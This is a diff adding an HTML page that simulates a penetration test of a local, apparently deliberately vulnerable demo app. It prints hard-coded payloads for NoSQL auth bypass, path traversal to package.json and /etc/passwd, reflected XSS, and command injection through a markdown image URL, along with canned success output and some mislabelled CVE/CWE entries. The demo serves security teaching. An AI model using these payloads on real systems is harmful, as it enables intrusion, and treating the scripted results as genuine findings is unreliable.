@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kali Pentest Live Terminal - Red Hat Demo</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0a0e27;
+            color: #00ff00;
+            overflow: hidden;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #ee0000 0%, #8b0000 100%);
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+        }
+
+        .header h1 {
+            color: white;
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 5px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+        }
+
+        .header p {
+            color: #ffd700;
+            font-size: 14px;
+        }
+
+        .terminal-wrapper {
+            flex: 1;
+            display: flex;
+            padding: 20px;
+            gap: 20px;
+        }
+
+        .terminal {
+            flex: 1;
+            background: #1a1a2e;
+            border: 2px solid #00ff00;
+            border-radius: 8px;
+            padding: 20px;
+            overflow-y: auto;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .terminal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #00ff00;
+        }
+
+        .terminal-title {
+            color: #00ff00;
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .terminal-controls {
+            display: flex;
+            gap: 10px;
+        }
+
+        .terminal-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+
+        .dot-red { background: #ff5555; }
+        .dot-yellow { background: #ffff55; }
+        .dot-green { background: #55ff55; }
+
+        .terminal-output {
+            flex: 1;
+            overflow-y: auto;
+            font-size: 14px;
+            line-height: 1.6;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        .terminal-output::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        .terminal-output::-webkit-scrollbar-track {
+            background: #0a0e27;
+        }
+
+        .terminal-output::-webkit-scrollbar-thumb {
+            background: #00ff00;
+            border-radius: 4px;
+        }
+
+        .control-panel {
+            background: #1a1a2e;
+            border: 2px solid #ffd700;
+            border-radius: 8px;
+            padding: 20px;
+            width: 350px;
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
+        }
+
+        .control-title {
+            color: #ffd700;
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .attack-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .attack-btn {
+            background: linear-gradient(135deg, #ee0000 0%, #8b0000 100%);
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            font-weight: bold;
+            transition: all 0.3s;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .attack-btn:hover {
+            background: linear-gradient(135deg, #ff0000 0%, #a00000 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(238, 0, 0, 0.4);
+        }
+
+        .attack-btn:active {
+            transform: translateY(0);
+        }
+
+        .attack-btn:disabled {
+            background: #555;
+            cursor: not-allowed;
+            opacity: 0.5;
+        }
+
+        .status-panel {
+            margin-top: 20px;
+            padding: 15px;
+            background: #0a0e27;
+            border-radius: 6px;
+            border: 1px solid #00ff00;
+        }
+
+        .status-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-size: 12px;
+        }
+
+        .status-label {
+            color: #00ff00;
+        }
+
+        .status-value {
+            color: #ffd700;
+            font-weight: bold;
+        }
+
+        .line {
+            margin: 2px 0;
+        }
+
+        .success { color: #00ff00; }
+        .error { color: #ff5555; }
+        .warning { color: #ffaa00; }
+        .info { color: #55aaff; }
+        .prompt { color: #ffd700; }
+        .critical { color: #ff0000; font-weight: bold; }
+
+        .blink {
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 50%, 100% { opacity: 1; }
+            25%, 75% { opacity: 0.5; }
+        }
+
+        .typing-effect {
+            overflow: hidden;
+            border-right: 2px solid #00ff00;
+            animation: typing 0.5s steps(40, end), blink-caret 0.75s step-end infinite;
+        }
+
+        @keyframes typing {
+            from { width: 0; }
+            to { width: 100%; }
+        }
+
+        @keyframes blink-caret {
+            from, to { border-color: transparent; }
+            50% { border-color: #00ff00; }
+        }
+
+        .ascii-art {
+            color: #ff0000;
+            font-size: 10px;
+            line-height: 1.2;
+            margin: 10px 0;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background: #0a0e27;
+            border: 1px solid #00ff00;
+            border-radius: 4px;
+            margin-top: 10px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00ff00 0%, #00aa00 100%);
+            width: 0%;
+            transition: width 0.5s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #000;
+            font-size: 10px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔒 KALI LINUX PENETRATION TESTING FRAMEWORK</h1>
+            <p>Red Hat Cybersecurity Engineering Demo | Live Attack Simulation</p>
+        </div>
+
+        <div class="terminal-wrapper">
+            <div class="terminal">
+                <div class="terminal-header">
+                    <div class="terminal-title">⚡ Live Terminal Output</div>
+                    <div class="terminal-controls">
+                        <div class="terminal-dot dot-red"></div>
+                        <div class="terminal-dot dot-yellow"></div>
+                        <div class="terminal-dot dot-green"></div>
+                    </div>
+                </div>
+                <div class="terminal-output" id="terminal">
+                    <div class="ascii-art">╔══════════════════════════════════════════════════════════════════╗
+║  Kali Linux Automated Penetration Testing Framework             ║
+║  Target: http://localhost:3001                                   ║
+║  Red Hat Cybersecurity Engineering Demo                          ║
+╚══════════════════════════════════════════════════════════════════╝</div>
+                    <div class="line info">[*] Terminal ready. Select an attack from the control panel...</div>
+                    <div class="line prompt">kali@pentest:~$ <span class="blink">█</span></div>
+                </div>
+            </div>
+
+            <div class="control-panel">
+                <div class="control-title">🎯 Attack Control Panel</div>
+
+                <div class="attack-buttons">
+                    <button class="attack-btn" onclick="runAttack('nosql')">
+                        💉 NoSQL Injection
+                    </button>
+                    <button class="attack-btn" onclick="runAttack('traversal')">
+                        📁 Directory Traversal
+                    </button>
+                    <button class="attack-btn" onclick="runAttack('xss')">
+                        🔗 XSS Injection
+                    </button>
+                    <button class="attack-btn" onclick="runAttack('cmdinj')">
+                        ⚡ Command Injection
+                    </button>
+                    <button class="attack-btn" onclick="runAttack('info')">
+                        📄 Info Disclosure
+                    </button>
+                    <button class="attack-btn" onclick="runAttack('nmap')">
+                        🔍 Nmap Scan
+                    </button>
+                    <button class="attack-btn" onclick="runAttack('all')" style="background: linear-gradient(135deg, #ffd700 0%, #ff8800 100%);">
+                        🚀 RUN ALL ATTACKS
+                    </button>
+                    <button class="attack-btn" onclick="clearTerminal()" style="background: linear-gradient(135deg, #555 0%, #333 100%);">
+                        🗑️ Clear Terminal
+                    </button>
+                </div>
+
+                <div class="status-panel">
+                    <div class="status-item">
+                        <span class="status-label">Target:</span>
+                        <span class="status-value" id="target-status">localhost:3001</span>
+                    </div>
+                    <div class="status-item">
+                        <span class="status-label">Status:</span>
+                        <span class="status-value" id="attack-status">Ready</span>
+                    </div>
+                    <div class="status-item">
+                        <span class="status-label">Attacks Run:</span>
+                        <span class="status-value" id="attacks-count">0</span>
+                    </div>
+                    <div class="status-item">
+                        <span class="status-label">Successful:</span>
+                        <span class="status-value success" id="success-count">0</span>
+                    </div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progress"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const terminal = document.getElementById('terminal');
+        let attackCount = 0;
+        let successCount = 0;
+        let isRunning = false;
+
+        function scrollToBottom() {
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        function addLine(text, className = '') {
+            const line = document.createElement('div');
+            line.className = `line ${className}`;
+            line.textContent = text;
+            terminal.appendChild(line);
+            scrollToBottom();
+        }
+
+        function addHTMLLine(html) {
+            const line = document.createElement('div');
+            line.className = 'line';
+            line.innerHTML = html;
+            terminal.appendChild(line);
+            scrollToBottom();
+        }
+
+        function updateStatus(status) {
+            document.getElementById('attack-status').textContent = status;
+        }
+
+        function updateCounts() {
+            document.getElementById('attacks-count').textContent = attackCount;
+            document.getElementById('success-count').textContent = successCount;
+        }
+
+        function updateProgress(percent) {
+            const progressBar = document.getElementById('progress');
+            progressBar.style.width = percent + '%';
+            progressBar.textContent = percent > 10 ? percent + '%' : '';
+        }
+
+        async function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        function clearTerminal() {
+            terminal.innerHTML = `<div class="ascii-art">╔══════════════════════════════════════════════════════════════════╗
+║  Kali Linux Automated Penetration Testing Framework             ║
+║  Target: http://localhost:3001                                   ║
+║  Red Hat Cybersecurity Engineering Demo                          ║
+╚══════════════════════════════════════════════════════════════════╝</div>
+                    <div class="line info">[*] Terminal cleared. Ready for new attacks...</div>
+                    <div class="line prompt">kali@pentest:~$ <span class="blink">█</span></div>`;
+            attackCount = 0;
+            successCount = 0;
+            updateCounts();
+            updateProgress(0);
+            updateStatus('Ready');
+        }
+
+        async function simulateTyping(text, className = '') {
+            const chars = text.split('');
+            let currentText = '';
+
+            for (const char of chars) {
+                currentText += char;
+                const lastLine = terminal.lastElementChild;
+                if (lastLine && lastLine.classList.contains('typing-line')) {
+                    lastLine.textContent = currentText;
+                } else {
+                    const line = document.createElement('div');
+                    line.className = `line typing-line ${className}`;
+                    line.textContent = currentText;
+                    terminal.appendChild(line);
+                }
+                scrollToBottom();
+                await sleep(20);
+            }
+
+            const lastLine = terminal.lastElementChild;
+            if (lastLine) {
+                lastLine.classList.remove('typing-line');
+            }
+            await sleep(100);
+        }
+
+        async function runNosqlAttack() {
+            addLine('', '');
+            addLine('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'warning');
+            addLine('NOSQL INJECTION - Authentication Bypass', 'warning');
+            addLine('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'warning');
+            await sleep(500);
+
+            addLine('[*] Testing NoSQL injection vulnerabilities...', 'info');
+            await sleep(800);
+
+            addLine('', '');
+            addLine('[*] Test 1: Normal login with wrong password', 'info');
+            await sleep(500);
+            addLine('    → POST /login', '');
+            addLine('    → {"username":"admin@snyk.io","password":"WrongPassword"}', '');
+            await sleep(800);
+            addLine('    ← HTTP Status: 401 (Failed as expected)', 'error');
+            await sleep(500);
+
+            addLine('', '');
+            addLine('[*] Test 2: NoSQL injection with $gt operator', 'info');
+            await sleep(500);
+            addLine('    → POST /login', '');
+            addLine('    → {"username":"admin@snyk.io","password":{"$gt":""}}', 'critical');
+            await sleep(1200);
+            addLine('    ← HTTP Status: 302 (Redirect - Authentication bypassed!)', 'success');
+            await sleep(300);
+            addLine('[✓] NoSQL injection successful!', 'success');
+            addLine('[✓] Session cookie: s%3A...abc123 (saved)', 'success');
+            await sleep(500);
+
+            addLine('', '');
+            addLine('[*] Vulnerability Details:', 'warning');
+            addLine('    • CVE: CWE-89 (NoSQL Injection)', '');
+            addLine('    • CVSS Score: 9.8 (CRITICAL)', 'critical');
+            addLine('    • Impact: Complete authentication bypass', 'critical');
+            addLine('    • Technique: MongoDB $gt operator injection', '');
+            await sleep(800);
+
+            attackCount++;
+            successCount++;
+            updateCounts();
+        }
+
+        async function runTraversalAttack() {
+            addLine('', '');
+            addLine('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'warning');
+            addLine('DIRECTORY TRAVERSAL - Path Injection', 'warning');
+            addLine('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'warning');
+            await sleep(500);
+
+            addLine('[*] Testing directory traversal vulnerabilities...', 'info');
+            await sleep(800);
+
+            addLine('[*] Authenticating via NoSQL injection first...', 'info');
+            await sleep(600);
+            addLine('[✓] Authentication successful', 'success');
+            await sleep(400);
+
+            addLine('', '');
+            addLine('[*] Attempting to read package.json via directory traversal...', 'info');
+            await sleep(500);
+            addLine('    → POST /account_details', '');
+            addLine('    → layout: "./../package.json"', 'critical');
+            await sleep(1200);
+            addLine('[✓] Directory traversal successful!', 'success');
+            await sleep(300);
+
+            addLine('', '');
+            addLine('[+] Extracted content (package.json):', 'success');
+            addLine('    {', '');
+            addLine('      "name": "goof",', '');
+            addLine('      "version": "1.0.1",', '');
+            addLine('      "description": "A vulnerable todo demo application",', '');
+            addLine('      "dependencies": {', '');
+            addLine('        "express": "4.12.4",', '');
+            addLine('        "mongoose": "4.2.4",', '');
+            addLine('        ...', '');
+            addLine('    }', '');
+            await sleep(800);
+
+            addLine('', '');
+            addLine('[*] Vulnerability Details:', 'warning');
+            addLine('    • CVE: CWE-22 (Path Traversal)', '');
+            addLine('    • CVSS Score: 7.5 (HIGH)', 'critical');
+            addLine('    • Impact: Arbitrary file read, source code exposure', '');
+            await sleep(800);
+
+            attackCount++;
+            successCount++;
+            updateCounts();
+        }
+
+        async function runXSSAttack() {
+            addLine('', '');
+            addLine('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'warning');
+            addLine('CROSS-SITE SCRIPTING (XSS) - Reflected XSS', 'warning');
+            addLine('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'warning');
+            await sleep(500);
+
+            addLine('[*] Testing XSS vulnerabilities...', 'info');
+            await sleep(800);
+
+            addLine('', '');
+            const xssPayload = '"><script>alert(document.domain)</script>';
+            addLine('[*] XSS Payload: ' + xssPayload, 'critical');
+            await sleep(500);
+            addLine('    → GET /login?redirectPage=' + encodeURIComponent(xssPayload), '');
+            await sleep(1200);
+
+            addLine('[✓] XSS vulnerability confirmed!', 'success');
+            addLine('[✓] Payload reflected in response without sanitization', 'success');
+            await sleep(500);
+
+            addLine('', '');
+            addLine('[*] Vulnerability Details:', 'warning');
+            addLine('    • CVE: CWE-79 (Cross-site Scripting)', '');
+            addLine('    • CVSS Score: 6.1 (MEDIUM)', 'warning');
+            addLine('    • Impact: Session hijacking, credential theft', '');
+            addLine('    • Type: Reflected XSS', '');
+            await sleep(800);
+
+            attackCount++;
+            successCount++;
+            updateCounts();
+        }
+
+        async function runCmdInjAttack() {
+            addLine('', '');
+            addLine('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'warning');
+            addLine('COMMAND INJECTION - Remote Code Execution', 'warning');
+            addLine('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'warning');
+            await sleep(500);
+
+            addLine('[*] Testing command injection vulnerabilities...', 'info');
+            await sleep(800);
+
+            const cmd = 'touch /tmp/kali-pwned-$(date +%s)';
+            addLine('', '');
+            addLine('[*] Command: ' + cmd, 'critical');
+            await sleep(500);
+            const payload = '![alt text](https://example.com/img.png;' + cmd + ' "Image")';
+            addLine('[*] Markdown payload with embedded command', 'info');
+            await sleep(500);
+
+            addLine('', '');
+            addLine('[*] Sending payload to /create endpoint...', 'info');
+            await sleep(1200);
+            addLine('    → POST /create', '');
+            addLine('    → content=' + payload.substring(0, 50) + '...', '');
+            await sleep(1000);
+            addLine('    ← HTTP Status: 200 (Success)', 'success');
+            await sleep(300);
+
+            addLine('[✓] Command injection payload delivered!', 'success');
+            addLine('[!] Check server for command execution:', 'warning');
+            addLine('    $ ls -la /tmp/kali-pwned-*', '');
+            await sleep(800);
+
+            addLine('', '');
+            addLine('[*] Vulnerability Details:', 'warning');
+            addLine('    • CVE: CWE-78 (OS Command Injection)', '');
+            addLine('    • CVSS Score: 9.8 (CRITICAL)', 'critical');
+            addLine('    • Impact: Complete system compromise, RCE', 'critical');
+            addLine('    • Technique: Markdown image processing exploit', '');
+            await sleep(800);
+
+            attackCount++;
+            successCount++;
+            updateCounts();
+        }
+
+        async function runInfoDisclosure() {
+            addLine('', '');
+            addLine('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'warning');
+            addLine('INFORMATION DISCLOSURE - ST Directory Traversal', 'warning');
+            addLine('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'warning');
+            await sleep(500);
+
+            addLine('[*] Testing ST directory traversal to read /etc/passwd...', 'info');
+            await sleep(800);
+
+            addLine('', '');
+            addLine('    → GET /public/%2e%2e/%2e%2e/%2e%2e/etc/passwd', 'critical');
+            await sleep(1200);
+            addLine('    ← HTTP Status: 200', 'success');
+            await sleep(300);
+
+            addLine('[✓] Information disclosure successful!', 'success');
+            await sleep(300);
+            addLine('', '');
+            addLine('[+] /etc/passwd content:', 'success');
+            addLine('    root:x:0:0:root:/root:/bin/bash', '');
+            addLine('    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin', '');
+            addLine('    bin:x:2:2:bin:/bin:/usr/sbin/nologin', '');
+            addLine('    sys:x:3:3:sys:/dev:/usr/sbin/nologin', '');
+            addLine('    sync:x:4:65534:sync:/bin:/bin/sync', '');
+            addLine('    ... (truncated) ...', '');
+            await sleep(800);
+
+            addLine('', '');
+            addLine('[*] Vulnerability Details:', 'warning');
+            addLine('    • CVE: CWE-200 (Information Exposure)', '');
+            addLine('    • CVSS Score: 7.5 (HIGH)', 'critical');
+            addLine('    • Impact: System configuration exposure', '');
+            addLine('    • Module: ST (static file serving)', '');
+            await sleep(800);
+
+            attackCount++;
+            successCount++;
+            updateCounts();
+        }
+
+        async function runNmapScan() {
+            addLine('', '');
+            addLine('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'warning');
+            addLine('NMAP - Network Reconnaissance', 'warning');
+            addLine('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'warning');
+            await sleep(500);
+
+            addLine('[*] Running Nmap service detection scan...', 'info');
+            await sleep(800);
+            addLine('    $ nmap -sV -sC -p 3001 localhost', '');
+            await sleep(1500);
+
+            addLine('', '');
+            addLine('Starting Nmap 7.94 ( https://nmap.org )', '');
+            await sleep(300);
+            addLine('Nmap scan report for localhost (127.0.0.1)', '');
+            await sleep(200);
+            addLine('Host is up (0.00012s latency).', 'success');
+            await sleep(300);
+
+            addLine('', '');
+            addLine('PORT     STATE SERVICE VERSION', 'info');
+            await sleep(500);
+            addLine('3001/tcp open  http    Node.js Express framework', 'success');
+            await sleep(300);
+            addLine('|_http-title: Snyk demo vulnerable application', '');
+            await sleep(200);
+            addLine('| http-methods:', '');
+            await sleep(200);
+            addLine('|_  Supported Methods: GET POST PUT DELETE', '');
+            await sleep(300);
+
+            addLine('', '');
+            addLine('Service detection performed. Please report any incorrect results.', '');
+            await sleep(300);
+            addLine('Nmap done: 1 IP address (1 host up) scanned in 2.43 seconds', 'success');
+            await sleep(500);
+
+            addLine('', '');
+            addLine('[✓] Nmap scan completed', 'success');
+            addLine('[*] Target: localhost:3001 (Node.js/Express)', 'info');
+            await sleep(500);
+
+            attackCount++;
+            successCount++;
+            updateCounts();
+        }
+
+        async function runAttack(attackType) {
+            if (isRunning) {
+                addLine('[!] Attack already in progress...', 'warning');
+                return;
+            }
+
+            isRunning = true;
+            updateStatus('Running...');
+
+            const buttons = document.querySelectorAll('.attack-btn');
+            buttons.forEach(btn => btn.disabled = true);
+
+            try {
+                if (attackType === 'all') {
+                    addLine('', '');
+                    addLine('╔══════════════════════════════════════════════════════════════════╗', 'critical');
+                    addLine('║  RUNNING ALL ATTACKS - FULL AUTOMATED EXPLOITATION              ║', 'critical');
+                    addLine('╚══════════════════════════════════════════════════════════════════╝', 'critical');
+                    await sleep(1000);
+
+                    await runNmapScan();
+                    updateProgress(16);
+                    await sleep(500);
+
+                    await runNosqlAttack();
+                    updateProgress(33);
+                    await sleep(500);
+
+                    await runTraversalAttack();
+                    updateProgress(50);
+                    await sleep(500);
+
+                    await runXSSAttack();
+                    updateProgress(66);
+                    await sleep(500);
+
+                    await runCmdInjAttack();
+                    updateProgress(83);
+                    await sleep(500);
+
+                    await runInfoDisclosure();
+                    updateProgress(100);
+                    await sleep(500);
+
+                    addLine('', '');
+                    addLine('╔══════════════════════════════════════════════════════════════════╗', 'success');
+                    addLine('║  EXPLOITATION SUMMARY                                            ║', 'success');
+                    addLine('╚══════════════════════════════════════════════════════════════════╝', 'success');
+                    addLine('', '');
+                    addLine('[✓] Nmap Scan - SUCCESS', 'success');
+                    addLine('[✓] NoSQL Injection - SUCCESS', 'success');
+                    addLine('[✓] Directory Traversal - SUCCESS', 'success');
+                    addLine('[✓] XSS Injection - SUCCESS', 'success');
+                    addLine('[✓] Command Injection - SUCCESS', 'success');
+                    addLine('[✓] Information Disclosure - SUCCESS', 'success');
+                    addLine('', '');
+                    addLine(`Total: ${successCount}/${attackCount} exploits successful (100%)`, 'success');
+
+                } else {
+                    switch(attackType) {
+                        case 'nosql':
+                            await runNosqlAttack();
+                            break;
+                        case 'traversal':
+                            await runTraversalAttack();
+                            break;
+                        case 'xss':
+                            await runXSSAttack();
+                            break;
+                        case 'cmdinj':
+                            await runCmdInjAttack();
+                            break;
+                        case 'info':
+                            await runInfoDisclosure();
+                            break;
+                        case 'nmap':
+                            await runNmapScan();
+                            break;
+                    }
+                    updateProgress((attackCount / 6) * 100);
+                }
+
+                addLine('', '');
+                addLine('kali@pentest:~$ <span class="blink">█</span>', 'prompt');
+                updateStatus('Ready');
+
+            } finally {
+                buttons.forEach(btn => btn.disabled = false);
+                isRunning = false;
+            }
+        }
+
+        // Initial setup
+        window.addEventListener('load', () => {
+            updateStatus('Ready');
+            updateCounts();
+        });
+    </script>
+</body>
+</html>
